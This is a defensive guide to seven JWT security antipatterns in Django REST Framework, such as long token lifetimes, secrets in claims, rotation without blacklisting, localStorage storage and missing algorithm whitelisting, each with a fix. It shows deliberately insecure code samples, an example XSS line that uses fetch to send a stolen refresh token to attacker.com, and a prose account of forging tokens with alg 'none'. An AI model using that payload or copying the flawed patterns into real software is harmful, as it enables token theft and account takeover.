# Critical Antipatterns in DRF JWT Authentication, Token Rotation & Blacklisting

This guide documents 7 prevalent architectural, cryptographic, and security antipatterns encountered when engineering JWT authentication in Django REST Framework, complete with production failure analyses and remediations.

---

## Antipattern 1: Setting Excessively Long Lifetimes on Access Tokens

### Severity: CRITICAL (Extended Compromise Window)

### The Flawed Pattern
```python
# settings.py - FLAW: 24-hour or 7-day access token!
from datetime import timedelta

SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME': timedelta(days=7), # <-- DANGEROUS!
    'REFRESH_TOKEN_LIFETIME': timedelta(days=30),
}
```

### The Failure Mechanism
1. The primary architectural benefit of JWT is **stateless verification**: API servers verify the cryptographic signature and expiration timestamp without querying a centralized database.
2. Because access tokens are stateless, **they cannot be remotely revoked** before their expiration timestamp (`exp`).
3. If an access token with a 7-day lifetime is intercepted (via network sniffing, rogue browser extension, or malicious proxy), the attacker possesses an un-revokable key to the victim's account for an entire week, even if the user immediately changes their password or clicks "Log Out".

### Production Remediation
Enforce short-lived Access Tokens (5 to 15 minutes) paired with long-lived, rotatable Refresh Tokens (1 to 7 days):

```python
# settings.py - RESOLVED
from datetime import timedelta

SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME': timedelta(minutes=15), # Short window of exposure
    'REFRESH_TOKEN_LIFETIME': timedelta(days=7),
    'ROTATE_REFRESH_TOKENS': True,
    'BLACKLIST_AFTER_ROTATION': True,
}
```

---

## Antipattern 2: Storing Sensitive Personal Data (PII) or Secrets in JWT Claims

### Severity: HIGH (Information Disclosure: CWE-312)

### The Flawed Pattern
```python
# serializers.py
class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):
    @classmethod
    def get_token(cls, user):
        token = super().get_token(user)
        # FLAW: Embedding raw passwords, social security numbers, or sensitive keys!
        token['password_hash'] = user.password
        token['social_security_number'] = user.ssn
        token['stripe_api_key'] = user.organization.stripe_api_key
        return token
```

### The Failure Mechanism
1. JWT payloads are encoded using standard **Base64URL**, which is **NOT encryption**.
2. Any client, network proxy, CDN, browser extension, or adversary who intercepts the token can paste it into `jwt.io` or run `base64 -d` to read every claim in plaintext.
3. Exposing password hashes facilitates offline dictionary attacks; leaking API keys compromises external cloud integrations.

### Production Remediation
Only embed non-sensitive metadata necessary for routing and coarse-grained authorization (e.g. `user_id`, `tenant_id`, `role`). Never store sensitive PII or credentials:

```python
# serializers.py - RESOLVED
class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):
    @classmethod
    def get_token(cls, user):
        token = super().get_token(user)
        # Safe: coarse authorization scopes only
        token['tenant_id'] = str(user.tenant_id)
        token['role'] = user.role
        return token
```

---

## Antipattern 3: Enabling Token Rotation Without Blacklisting (`ROTATE_REFRESH_TOKENS` without `BLACKLIST_AFTER_ROTATION`)

### Severity: HIGH (Multiplication of Active Refresh Tokens)

### The Flawed Pattern
```python
# settings.py
SIMPLE_JWT = {
    'ROTATE_REFRESH_TOKENS': True,          # Issues new refresh token on refresh
    'BLACKLIST_AFTER_ROTATION': False,      # <-- FLAW: Leaves old token valid!
}
```

### The Failure Mechanism
1. Every time `/api/token/refresh/` is called, the server issues a new refresh token.
2. Because `BLACKLIST_AFTER_ROTATION = False`, the **previous refresh token remains completely valid** until its natural expiration.
3. If an application refreshes tokens every 15 minutes, a single user creates dozens of active, valid refresh tokens simultaneously.
4. If an attacker steals any previously rotated refresh token from browser history or logs, they can use it without triggering any conflict or invalidation.

### Production Remediation
Always pair `ROTATE_REFRESH_TOKENS = True` with `BLACKLIST_AFTER_ROTATION = True`, and add `rest_framework_simplejwt.token_blacklist` to `INSTALLED_APPS`:

```python
# settings.py - RESOLVED
INSTALLED_APPS = [
    # ...
    'rest_framework_simplejwt',
    'rest_framework_simplejwt.token_blacklist',
]

SIMPLE_JWT = {
    'ROTATE_REFRESH_TOKENS': True,
    'BLACKLIST_AFTER_ROTATION': True, # Invalidate old refresh token immediately!
}
```

---

## Antipattern 4: Storing Tokens in Web `localStorage` (XSS Exposure)

### Severity: HIGH (Credential Exfiltration via Cross-Site Scripting)

### The Flawed Pattern
```javascript
// frontend app (React / Vue)
// FLAW: Storing JWT tokens in window.localStorage
const response = await api.post('/api/token/', credentials);
localStorage.setItem('access_token', response.data.access);
localStorage.setItem('refresh_token', response.data.refresh);
```

### The Failure Mechanism
1. Any JavaScript running on the domain has unrestricted read access to `window.localStorage`.
2. If your application or any third-party npm dependency (analytics, tracking tags, chat widgets) suffers from a **Cross-Site Scripting (XSS)** vulnerability:
   ```javascript
   // Malicious script injected via XSS:
   fetch('https://attacker.com/steal?token=' + localStorage.getItem('refresh_token'));
   ```
3. Attackers can exfiltrate the refresh token silently and take over user accounts.

### Production Remediation
Store the short-lived access token in memory (React state or closure) and store the long-lived refresh token in an **`HttpOnly`, `Secure`, `SameSite=Strict` cookie**:

```python
# views.py - RESOLVED (Setting HttpOnly Cookie on login)
response = Response({'access': access_token})
response.set_cookie(
    key='refresh_token',
    value=refresh_token,
    httponly=True,   # Inaccessible to JavaScript!
    secure=True,     # Transmitted ONLY over HTTPS
    samesite='Strict',# Defends against CSRF attacks
    max_age=7 * 86400,
)
return response
```

---

## Antipattern 5: Neglecting to Schedule `flushexpiredtokens` (Unbounded Database Bloat)

### Severity: MEDIUM (Storage Exhaustion & Slow Blacklist Lookups)

### The Flawed Pattern
```python
# Team deploys SimpleJWT token_blacklist to production.
# Nobody schedules token pruning.
# 18 months later...
# Table token_blacklist_outstandingtoken has grown to 85 million rows!
```

### The Failure Mechanism
1. SimpleJWT records every rotated refresh token in `token_blacklist_outstandingtoken` and `token_blacklist_blacklistedtoken`.
2. Once a token's `exp` timestamp has passed, it is mathematically expired and will naturally be rejected by cryptographic signature checks. It no longer needs to occupy disk space.
3. Unbounded table growth increases index size, slows down `INSERT` operations on login/refresh, and exhausts database disk allocations.

### Production Remediation
Schedule DRF's `flushexpiredtokens` command using Celery Beat or a system cron job to run daily during off-peak hours:

```python
# tasks.py - RESOLVED
from celery import shared_task
from django.core.management import call_command

@shared_task
def flush_expired_jwt_tokens_task():
    """Prunes expired tokens from blacklist tables daily."""
    call_command("flushexpiredtokens")
```

---

## Antipattern 6: Missing Algorithm Whitelisting (The `alg: "none"` & Key Confusion Exploits)

### Severity: CRITICAL (Complete Authentication Bypass: CVE-2015-9235)

### The Flawed Pattern
```python
# custom_auth.py
import jwt # PyJWT or custom decoder

def verify_token(raw_token, secret_key):
    # FLAW: Decoding without specifying expected algorithms!
    # If attacker sends header: {"alg": "none"}, PyJWT allows unsigned tokens!
    return jwt.decode(raw_token, secret_key, algorithms=None)
```

### The Failure Mechanism
1. RFC 7519 allows tokens to specify `"alg": "none"` for unsecured tokens without signatures.
2. In vulnerable or misconfigured libraries, decoding without an explicit `algorithms=['HS256']` whitelist allows an attacker to create a token with `{"alg": "none"}`, set `{"user_id": 1, "is_superuser": true}`, omit the signature, and bypass authentication entirely.
3. Similarly, if an asymmetric RS256 server accepts HS256, an attacker can sign a forged token using the server's public key as an HMAC secret!

### Production Remediation
Always explicitly enforce the algorithm whitelist:

```python
# custom_auth.py - RESOLVED
import jwt

def verify_token(raw_token, secret_key):
    # Strictly whitelist HS256
    return jwt.decode(
        raw_token,
        secret_key,
        algorithms=['HS256'], # Rejects 'none', RS256, and all others
        options={'require': ['exp', 'iat', 'jti']},
    )
```

---

## Antipattern 7: Querying the Database for Full User Profile on Every Stateless Access Token Verification

### Severity: MEDIUM (Negating the Performance Benefits of JWT)

### The Flawed Pattern
```python
# authentication.py
class InefficientJWTAuthentication(BaseAuthentication):
    def authenticate(self, request):
        token = self.get_validated_token(request)
        user_id = token['user_id']
        
        # FLAW: Querying PostgreSQL database on 100% of API calls!
        user = User.objects.select_related('profile', 'organization').get(id=user_id)
        return (user, token)
```

### The Failure Mechanism
1. The entire architectural reason to use JWTs instead of Django session cookies is to **eliminate the database query overhead on every HTTP request**.
2. If `authenticate()` queries the database for `User.objects.get(id=user_id)` on every request, your API has all the complexities of JWT (blacklisting, rotation, clock skew) with **none of the horizontal scaling benefits of statelessness**.

### Production Remediation
Embed essential user claims (`user_id`, `tenant_id`, `role`) directly in the access token, and construct a lightweight user proxy or cache user instances in Redis for high-throughput endpoints:

```python
# authentication.py - RESOLVED
from django.core.cache import cache

class CachedJWTAuthentication(BaseAuthentication):
    def authenticate(self, request):
        token = self.get_validated_token(request)
        user_id = token['user_id']

        # Check local Redis cache before querying PostgreSQL
        cache_key = f"user_auth_cache:{user_id}"
        user = cache.get(cache_key)

        if user is None:
            user = User.objects.get(id=user_id, is_active=True)
            cache.set(cache_key, user, timeout=300) # 5-minute cache

        return (user, token)
```
